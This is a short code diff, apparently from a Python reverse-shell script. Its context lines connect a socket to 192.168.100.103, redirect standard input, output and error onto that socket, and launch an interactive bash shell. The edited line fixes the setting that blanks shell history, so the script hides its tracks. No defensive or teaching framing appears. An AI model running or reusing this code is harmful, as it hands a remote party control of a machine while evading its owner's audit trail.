@@ -13,7 +13,7 @@ s.connect(('192.168.100.103', '9999'))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
-os.putenv('HISTSIZE', 0)
+os.putenv('HISTSIZE', "0")
 subprocess.call(['/bin/bash', '-i'])
 
 os.close()
